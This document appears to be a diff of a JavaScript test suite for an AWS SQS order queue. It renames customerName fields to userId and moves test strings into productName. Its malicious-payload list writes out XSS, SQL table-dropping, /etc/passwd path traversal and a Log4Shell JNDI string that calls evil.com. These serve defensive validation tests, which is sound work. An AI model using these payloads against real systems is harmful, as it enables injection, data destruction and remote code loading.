@@ -35,7 +35,7 @@ describe('SQS Security Tests', () => {
       const command = new SendMessageCommand({
         QueueUrl: QUEUE_URL,
         MessageBody: JSON.stringify({
-          customerName: 'Unauthorized User',
+          userId: 999,
           productName: 'Hacked Product',
           quantity: 1,
           totalPrice: 100.00,
@@ -70,7 +70,7 @@ describe('SQS Security Tests', () => {
       const command = new SendMessageCommand({
         QueueUrl: QUEUE_URL,
         MessageBody: JSON.stringify({
-          customerName: 'Unauthorized User',
+          userId: 999,
           productName: 'Hacked Product',
           quantity: 1,
           totalPrice: 100.00,
@@ -207,10 +207,10 @@ describe('SQS Security Tests', () => {
       });
 
       const maliciousPayloads = [
-        { customerName: '<script>alert("xss")</script>', productName: 'Test', quantity: 1, totalPrice: 10 },
-        { customerName: '"; DROP TABLE orders; --', productName: 'Test', quantity: 1, totalPrice: 10 },
-        { customerName: '../../../etc/passwd', productName: 'Test', quantity: 1, totalPrice: 10 },
-        { customerName: '${jndi:ldap://evil.com/a}', productName: 'Test', quantity: 1, totalPrice: 10 },
+        { userId: 1, productName: '<script>alert("xss")</script>', quantity: 1, totalPrice: 10 },
+        { userId: 1, productName: '"; DROP TABLE orders; --', quantity: 1, totalPrice: 10 },
+        { userId: 1, productName: '../../../etc/passwd', quantity: 1, totalPrice: 10 },
+        { userId: 1, productName: '${jndi:ldap://evil.com/a}', quantity: 1, totalPrice: 10 },
       ];
 
       // These should be sent to SQS but rejected at the API Gateway level
@@ -249,8 +249,8 @@ describe('SQS Security Tests', () => {
 
       // SQS has a maximum message size of 256 KB
       const largePayload = {
-        customerName: 'A'.repeat(300 * 1024), // 300 KB
-        productName: 'Test',
+        userId: 1,
+        productName: 'A'.repeat(300 * 1024), // 300 KB
         quantity: 1,
         totalPrice: 10,
       };
@@ -340,7 +340,7 @@ describe('SQS Security Tests', () => {
         const command = new SendMessageCommand({
           QueueUrl: QUEUE_URL,
           MessageBody: JSON.stringify({
-            customerName: `Customer ${i}`,
+            userId: i + 1,
             productName: `Product ${i}`,
             quantity: 1,
             totalPrice: 10.00,
@@ -446,7 +446,7 @@ describe('SQS Security Tests', () => {
         const sendCommand = new SendMessageCommand({
           QueueUrl: QUEUE_URL,
           MessageBody: JSON.stringify({
-            customerName: 'Test User',
+            userId: 1,
             productName: 'Test Product',
             quantity: 1,
             totalPrice: 10.00,
